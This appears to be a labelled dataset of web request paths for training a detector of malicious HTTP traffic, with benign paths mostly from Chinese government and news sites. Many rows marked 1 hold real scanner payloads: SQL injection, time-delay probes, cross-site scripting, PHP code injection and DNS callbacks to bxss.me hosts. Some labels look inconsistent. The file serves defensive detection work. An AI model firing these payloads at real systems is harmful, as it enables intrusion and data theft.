request	label
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8363\u76db\u8d85\u5e02\u5e78\u798f\u7acb\u65b9\u5e97	0
/*******/qiye/b-e1978045.html	0
/****/system/2016/10/19/javascript:dozoom(12)	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6c88\u6625\u767d\u6761\u9e2d\u7ecf\u9500\u90e8	0
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/\ufffd\ufffd\u00f3\ufffd\ufffd\u0579	0
/****/web/search?channelid=299868&perpage=1000%') or 1425=1425 /*	1
/enjoymobilexcx_mt/****/downloadimage/?id=5c30cb04-4b41-4ded-9055-6e7ac382eb90	0
/****/system/2013/08/09/javascript:window.close();	1
/******/2018index/navbg18.png	0
"/******/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror=""alert(777)""/>"	1
/**********/system/2021/11/11/013478550.shtml	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/******/index.html"	1
/****/20201028/e109324754.html	0
/zwxx_11337/****/202109/t20210915_3031895.html	0
/zwxx_11337/****/index_21.html	0
/*******/qiye/b-e1519666.html	0
/****/gjzqq/index.html?continent=%') or 0444=6227 /*	1
/**********/system/2021/03/01/013342505.shtml	0
/zwxx_11337/****/202004/t20200401_2009191.html	0
/****/b-e179522.html	0
/****/system/2021/05/06/javascript:void(0);	1
/zwxx_11337/****/201809/t20180925_1072697.html	0
/**********/system/2020/06/15/013185846.shtml	0
/**********/system/2021/08/02/013429305.shtml	0
/wp-content/*******/wp-layerslider/layerslider.php?login=xoakx	1
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/ncwywfgz/zws/yzq/xmb_gzdxb.htm"	1
"/****/gfxwj/202005/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/******/resource/code/datainput.jsp?owner=%' or 7886=7886 and '%%'='%	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u5510\u672c\u8bb0\u9152\u4e1a\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5c0f\u519b\u7535\u710a\u4fee\u7406\u90e8	0
/**/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777)	1
/****/xqdt/hnx/201912/t20191223_145733.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u96c5\u4e4b\u8da3\u6210\u4eba\u7528\u54c1\u6e56\u6ee8\u4e1c\u8857\u5e97	0
/****/tzgg/tz16/201612/images/swfobject.js	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtl7xqgh6cow7gbkzsatfszk=&openid=ovl7jjjdzybd3abw3jlkeoct8f3u&outer_str=14372&activate_ticket=fdzv9emqaffrnr3xboqhbycifyhctwdr wmda2wxnyfoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi2xvuifz1hixgvcksbdosyi=	0
"/***/player.swf?autostart=true'""""/><img src=javascript:alert(2582)>&file=http://www.qhnews.com/index/gywm/dwxc.flv"	1
/****/zt/sbjlzqh/201611/t20161103_330236.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_'.gethostbyname(lc('hitpz'.'qsgttwjl8d00c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(66).chr(100).chr(74).'/list.html	1
/****/20201109/e110022226.html	0
/**********/system/2020/04/28/013151094.shtml	0
/****/wyp38y-syxw-e115139294.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033' and 3453=5048 and '1'='1&owner=1707212448	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5b9d\u5b81\u6d17\u8863\u5e97	0
/******/system/2018/01/26/javascript:void(0);	1
/**/index.php?do=post&id=284&c=dt&a=goods&	1
/******/zw-lfbg.png	0
/****/js/jsencrypt/jsencrypt.min'||'.js	1
/******/resource/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/counter.js	1
/********/wd-demo/index.php?c=prompt(777)	1
"/****/""""><script>alert(60)</script>"	1
/****/0426/381585.shtml	0
/**/system/2021/12/12/012229682.shtml	0
/******/system/2017/05/15/012310619.shtml	0
/****/web/search?page=2&channelid=253477%' and 7076=7076 and '%'='&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
"/****/search.jspx?q="""";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"""""	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e00\u54c1\u8317\u9999\u8336\u5e97	0
/***/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/****/yfyfwpt/gjhzjd/	1
/******/plus/view.php?aid=15323	1
/*******/20191024/598ea708b33905d73cc0e25f254f9c58.png	0
/***/ywly/gccb/qcgc/xwzx/gzdt/qywh/bqsm/kjcx/xyfw/bzhwyh/	0
/**/ui/widgets/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/validity/validity.js	1
/******/ly_gj_tpxwb_15.png	0
/*****/h1580588432.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u518d\u56de\u9996\u7406\u53d1\u5e97\u5bb6\u548c\u6625\u5929\u5e97	0
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_117591c92de8950a0e3021ce67a6b70f/><!--<textarea>	1
/*****/system/2019/04/30/javascript:window.close();	1
/***/mobile_h5/waparticledetail.do?article_id=202101201608581161&contenttype=article	0
/**********/system/2015/12/05/011880914.shtml	0
"/************/categorysearch.do?cateid=1&eq=1'""""()&%<acx><script >zsez(9531)</script>&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/****/system/2020/11/24/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5929\u76db\u7199\u5546\u5e97	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u90ca\u53cc\u742a\u5efa\u6750\u7ecf\u9500\u90e8	0
/**********/gjxw/	0
"/***/getsubject?data={""subject_id"":609,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":379045,""sign"":""""}"	0
/******/web/messagebook/que_code.jsp?random=' and 'f'='f	1
/*****/image/gemzfw.jpg	0
/****/201909/t20190926_1757205.html	0
/**********/system/2021/03/18/013353186.shtml	0
/****/zycs/201706/w020170720648605482954.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u9547\u5360\u6c34\u7535\u710a\u4fee\u7406\u90e8	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u7ee7\u8d22\u9762\u98df\u52a0\u5de5\u90e8	0
/***/0/00/56/65/566504_850602.jpg	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u624b\u673a\u82af\u7247	0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=sifa¤tpage=18&query=java	0
/***/ftl/common/jquery.min.js	0
"/****/zfwjn/1088/1095/list.html?new=0.12735219527013664'""""()&%<acx><script >u2yp(9248)</script>"	1
/***********/jinrongqihuo/if(now()=sysdate(),sleep(6),0)/index_2.html	1
/******/system/2017/01/06/javascript:void();	1
/**********/system/2020/09/30/013257643.shtml	0
/****/czgk/bmjs/sydw1/zzqwxdglwyhbgs	0
"/******/20190808.swf/""><script>alert(181)</script>"	1
"/****/xxgkzd/list.html?new=0.8921938434089278'""""()&%<acx><script >n6dj(9361)</script>"	1
/****/system/2006/08/23/000001296.shtml	0
/***/0/00/03/39/33961_927392.jpg	0
/zwxx_11337/****/201903/t20190328_1357545.html	0
/****/ad_js.php?aid=7&c=assert	1
/****/ftl/common/table/extensions/bootstrap-table/bootstrap-table.css	0
/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 and 7175=7746--	1
/****/rsxcsx/zyrsbd/202007/t20200703_249849.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u5174\u987a\u62db\u5f85\u6240	0
/****/system/2021/11/18/012223864.shtml	0
"/*****/system/2021/01/21/013323672'""/><script>alert(1134)</script>.shtml"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8d63\u5546\u95e8\u7a97\u52a0\u5de5\u90e8	0
/******/mztj/	0
/***/scripts/ueditor/net/upload/2019-08-19/505997e9-c6cc-4cdb-ad45-4438bd63be76.png	0
/******/mswpmm/common/newaccount.aspx?btncancel=alert(777)	1
"/*********/index/login/index.html?fromurl=st4r7s<d3v	onmouseover	=	(prompt)``
x//qqqxss3nd"	1
/****/css/1.css	0
/****/zdlygk/gytdsdfwzs/zzq/zcwj'||'.htm	1
/****/bmkx/srsj/201610/t20161025_37396.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7b11\u76ee\u65e5\u7528\u767e\u8d27\u5546\u884c	0
/***/rsordernorecording/saverecord.z	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6653\u73ca\u82b1\u5349\u5e97	0
/*******/zwgk/czgk/bmyjs/zzqjcyxt/wzsjcy/	0
/******/system/2020/03/04/013102852.shtml	0
/****/jtdt/2012jtdt/201412/t20141218_37575.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u742a\u8bda\u88c5\u9970\u6750\u6599\u7ecf\u9500\u90e8	0
/*******/	1
/**************/answersheet/answersheet.html	0
/*****/gy48/cpgyss.asp?key=\u6210\u90fd\u53d1\u7535\u673a\u7ec4&l=\ufffd\ufffd\ufffd\ufffd	0
/***/0/02/04/58/2045841_261265.png	0
/***/0/01/91/57/1915796_821229.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u946b\u4e34\u65b0\u80fd\u6e90\u4ea7\u4e1a\u6295\u8d44\u4e2d\u5fc3(\u6709\u9650\u5408\u4f19)	0
"/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new=0.7709305099762387'""""()&%<acx><script >vezc(9874)</script>"	1
/****/whhd/201803/t20180305_183321.html' and 'x'='y	1
/****/system/2013/07/01/011122717.shtml	0
/***/ftl/common/highcharts-7.1.2/oldie.js	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e01\u8587\u51c0\u6c34\u8bbe\u5907\u7ecf\u9500\u90e8	0
/***/interface/url_total_pv.json.jsp?callback=jquery191010938776113368442_1639980086740	0
"/?<frame src=n onload=""this.onload='';this.src='//nrdhxxph5i14t34vnwh_wp6hadq29odjskwcl6n3' 'zqo.r87.me/*/?' location.href"">"	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(84).concat(111).concat(71) (require""""socket""""
socket.gethostbyname(""""hitnt"""" """"thgkaznbd9114.bxss.me."""")[3].to_s) """"/***/phone.js"	1
/**********/system/2016/09/18/012133607.shtml	0
/****/qtgkxx/\u5fae\u4fe1\u56fe\u7247_20201201164017.jpg	0
/****/xqdt/byq/201712/w020171225597432636712.jpg	0
/****/zfxxgkzd/index_3.html	0
/**********/system/2021/02/15/013337059.shtml	0
/**********/gjxw/index.shtml	0
/****/system/2021/11/25/013485362.shtml	0
"/****/qzfwj/202009/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u4e94\u91d1\u4ea4\u7535\u91c7\u8d2d\u4f9b\u5e94\u7ad9	0
/***/ijm/iujm/rfwqrw/jw.html	0
/****/bmkx/snmj/202011/w020201126323164828652.png	0
/****/qzfwj/201912/t20191203_1869447.html	0
/**********/system/2020/03/20/013120176.shtml	0
/****/gjdjbn/jdbn_ewm/202103/w020210326367502803262.jpg	0
/****/web/search?&channelid=234439&searchword=reserve&keyword=reserve	0
/**/gywm_10175/gjglry	0
/******/system/2017/07/14/javascript:void(0);	1
/***/0/02/12/43/2124387_355882.jpg	0
"/*/'""""()&%<acx><script >u4vx(9788)</script>-2/index/753947c86c4981426850a2ab09d4614a.css"	1
/*****/gy48/cpgyss.asp?key=\u02b3\u01b7\ufffd\ufffd\u0435\ufffd\ufffd&l=\ufffd\u0ea3	0
/**********/system/more/201000000000000/0079/201000000000000_00007974.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f4e\u7ea7\u8da3\u5473	0
/****/zzxxgk/tjj/zfxxgkzn_2123/list.html?new=if(now()=sysdate(),sleep(15),0)	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u4e3d\u8f89\u9e21\u86cb\u5e97	0
"/***/getlist?data={""channel_id"":""12563"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/****/mavideo/gvideos.php?gid=1 and 1=1	1
/zwxx_11337/****/	0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u76db\u4e30\u5bb6\u5ead\u519c\u573a	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u5e7f\u6e90\u70df\u9152\u4fbf\u5229\u5e97	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u53cc\u5faa\u73af	0
/****/zt/msss/msxw/201503/t20150317_325499.html	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u94f6\u884c\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u5760\u4ea1	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u946b\u76db\u6e90\u6c7d\u8f66\u4fee\u7406\u5382	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u660c\u76db\u6279\u53d1\u90e8	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/202103/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/****/system/2016/08/29/javascript:window.print()	1
"/******/457/layout.js/""><script>alert(7671)</script>"	1
/**********/system/2018/11/29/012755095.shtml	0
"/********/2?page=2'""()&%<acu><script>9112(9131)</script>"	1
/**********/system/2021/10/15/013464862.shtml	0
/*******/qiye/e142245904.html	0
/zwxx_11337/****/202105/t20210520_2848290_zzb.html	0
/*****/gy48/ljcpgyview.asp?id=40604227&l2=\ufffd\u03fe\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zgsdt/2013zgsdt/201412/t20141218_41650.html	0
/*/file/202105/5c03424b2a06cfbe8e0d5fedac093439.pdf	0
"/*/210514-'""""()&%<acx><script >rsbr(9740)</script>/index/93aa5449bf388d846409a3d11e199a08.css"	1
/zwxx_11337/****/201909/t20190906_1725593.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u805a\u7f18\u658b\u9762\u9986	0
/**********/system/2021/10/24/013469226.shtml	0
/****/202101/t20210106_2556194.html	0
/****/web/search?channelid=254846&searchword=北京' && benchmark(2999999,md5(now())) order by 81	1
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/css.js	1
/**/mediacenter/news/202004/t20200401_245164.html	0
/****/zt/msss/msxw/201803/t20180308_700822.html	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(378)</script>?_=1630311383844"	1
/****/bmkx/sfgw/201912/t20191224_145792.html	0
/****/20201014/e108331815.html	0
/****/yfyfwpt/gjgcjsyjzx/' and 'x'='y	1
/******/sjd/js/koala.min.1.5.js	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u9526\u7ee3\u82d1\u5c0f\u533a\u7ea2\u857e\u5546\u884c	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqczt/201808/t20180816_978330.html	0
/****/api/****/getdetectinfo?lxsj=13265419803	0
/****/zjb/	0
/****/l0s4r.php	1
/***/0/02/07/26/2072650_998976.jpg	0
/****/zdlygk/czzjzdjc/202112/p020211217360266249852.pdf	0
/***/003/004/432/00300443273_c6bf54c6.jpg	0
/zwxx_11337/****/zcjd/202003/t20200309_1983243.html	0
/**********/system/2020/06/28/013194051.shtml	0
/***/2020/8/28/art_34_217445.html	0
/******/system/2014/05/27/011409108.shtml	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u53e4\u6d6a\u624b\u5de5\u9992\u5934\u5e97	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6d2a\u5e7f\u9547\u5b8b\u5251\u519c\u5bb6\u4e50	0
/******/public/2019/07/12/92289.images/v92289_b1562927367419_app.jpg	0
/****/web/search?page=58&channelid=222832&searchword=\u738b\u548c\u5c71&keyword=\u738b\u548c\u5c71&perpage=20&outlinepage=10	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9a6c\u6ce2\u767e\u8d27\u5546\u5e97	0
/*****/201610/t20161016_546.html?leader=\u5f20\u660e\u73ba	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u9547\u53cc\u661f\u8fbe\u5821\u65af\u8fbe\u8f6e\u80ce\u4fee\u7406\u90e8	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u8317\u946b\u6da6\u6ed1\u6cb9\u7ecf\u9500\u90e8	0
"/**/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl="""".gethostbyname(lc(""""hitln"""".""""nkhkyukse0a08.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(99).chr(75).chr(101).chr(76).""""&websiteid=110105008056111"	1
/****/gjjtwzq/gjcp/qywh/sjsb/gjjtwzq/ywzzq/gygj/ssgs/xwzx/xwzx/gjjj/gjcp/nyjx/nbfw/xwzx/gjmt/jtwxq/kjcx/kycg/kjjl/xwzx/gjmt/jtwxq/	0
/***/0/01/91/53/1915364_595786.jpg	0
/****/zt/zablh/201509/t20150911_331262.html	0
/*******/taglib/shell.lib.php	1
/****/0121/314820.shtml	0
/**/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/ljzsjztdlfjxly/tt/javascript:void(0);	1
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/index_3.html	0
/****/kjzl/fzzl/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/**/system/2021/12/19/012231732.shtml	0
/****/login.html?status='</script><script>alert(777)</script>	1
/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1&month=5&year=2018&day=1&pag=<script language='php'>echo 10516*61501;</script>	1
/***/0/01/12/43/1124324_173557.jpg	0
/****/gccb/jcgc/	0
/***/viewspace-191.html	0
"/****/qzfwj/202102/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/system/2021/09/29/013458352.shtml	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u05aa\u046b	0
/****/b-e380420.html	0
/****/20211110/10722.html	0
"/******/hhs/js/jquery-1.4a2.min.js/<img src=""javascript:alert(42)"">"	1
/**********/system/2020/04/06/013132849.shtml	0
/****/zdlygk/ncwywfgz' and 2*3*8=6*8 and 'ix6m'='ix6m/zws/yzq/xmb_gzdxb.htm	1
/**/index.php?do=post&id=319&c=dt&a=goods&	1
/**********/system/2021/05/12/013383921.shtml	0
/****/wdsjs/hfswsj/202108/t20210810_185574.html	0
/***/800/11/05/17/11051744_383343.jpg	1
"/****/中国?page='""""()&%<acx><script >hbme(9271)</script>"	1
"/******/jslib/grouppic'""""()&%<acx><script >gejm(9720)</script>/jquery.ad-gallery.js"	1
/**********/system/2020/03/29/013127336.shtml	0
/**********/system/2021/12/18/013496436.shtml	0
/**/qlh/javascript:void(0);	1
/******/appweb.do?method=appdatadetail&groupid=293&appid=348&dataid=69233	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u59da\u4f0f\u9547\u5c0f\u5f20\u95e8\u5e02\u90e8	0
/**********/system/2021/02/22/013339608.shtml	0
/****/web/search?searchword=1&channelid=287219&perpage=24') or 0043=0043 and '1'='1&templet=1&token=1	1
/****/b-e513234.html	0
/*****/system/2019/07/24/javascript:window.print()	1
"/"""".gethostbyname(lc(""""hitfc"""".""""khzlupybb49c8.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(112).chr(85).chr(103).chr(87).""""/*****/1079/1081/list.html"	1
/**/system/2007/07/24/002165722.shtml	0
/**********/system/2020/06/09/013181627.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u65f6\u5c1a\u4e00\u54c1\u7f8a\u6742\u788e\u5e97	0
/****/czgk/bmyjs/gmzdp/zzqngd/201802/t20180223_692796.html	0
/****/znzt/jlft/	0
/****/gfxwj/201806/t20180618_825356.html	0
/****/202105/t20210512_2839065.html	0
/****/czgk/bmjs/zzqjcyxt/lwsrmjcy/202008/t20200818_2189453.html	0
/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?calendar_id=1' and 1=dbms_pipe.receive_message(7d,15) and '1'='1&day=1&month=5&pag=1&year=2018	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6c38\u5b89\u5df7\u725b\u8857\u62db\u5f85\u6240	0
/**/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
/***/nbhd/opengovmsgbox.do?pageindex=1&siteid=115; waitfor delay '0:0:2&method=listgovmsgboxs&pagesize=15&appid=4	1
/*******/images/2018/11/22/1542880128_classify_img.jpg	0
/***/index.php?i=8&schoolid=46&c=entry&op=scanpay&batch_no=bpr0016870000000001&do=cost&m=fm_jiaoyu&_rand=1604301879	0
/**********/system/2020/05/28/013172830.shtml	0
/****/czgk/bmjs/gmzdp/zzqmm/201908/t20190808_1654761.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u6da6\u4e30\u8282\u6c34\u704c\u6e89\u4ea7\u54c1\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u4ec1\u9547\u5f20\u6d77\u71d5\u8d27\u8fd0\u4fe1\u606f\u90e8	0
/****/xxgkzn/bxss.me.html	1
/**********/system/2020/06/24/013192073.shtml	0
/****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/****/czgk/bmyjs/zzqjcyxt/ycxjcy/201802/t20180223_692923.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7cbe\u8d28\u8bda\u88c5\u9970\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u6da6\u67cf\u5546\u8d38\u6709\u9650\u8d23\u4efb\u516c\u53f8	0
/******/system/2021/12/21/javascript:window.print()	1
/******/public/2021/11/26/20211126_17d5b7233c5_r1.mp4	0
/****/20200920/e107101760.html	0
/zwxx_11337/****/202006/t20200603_2127162.html	0
/****/zdlygk'||'/ncwywfgz/wzs/hsbq/xmb_gzdxb.htm	1
/****/js/chunk-3dd387cc.a026c10d.js	0
"/****/' 'a'.concat(70-3).concat(22*4).concat(120).concat(76).concat(108).concat(85) (require'socket'
socket.gethostbyname('hitqe' 'zyguhgpy8ba34.bxss.me.')[3].to_s) '/202107/t20210723_2938511.html"	1
"/***/getsubject?data={""subject_id"":468,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":126985,""sign"":""""}"	0
/**/index.php?do=post&id=296&c=dt&a=goods&	1
/*******/qiye/b-e1441872.html	0
/******/system/2020/04/20/013144525.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u805a\u7f18\u793e\u8336\u884c	0
/zwxx_11337/***/201805/t20180517_758928.html	1
/****/system/2007/03/12/javascript:dozoom(9)	1
/***/0/01/26/02/1260276_561771.jpg	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u897f\u5b89\u9547\u7ee7\u51ef\u4e94\u91d1\u95e8\u5e02\u90e8	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u767e\u5229\u901a\u679c\u4e1a\u6709\u9650\u516c\u53f8	0
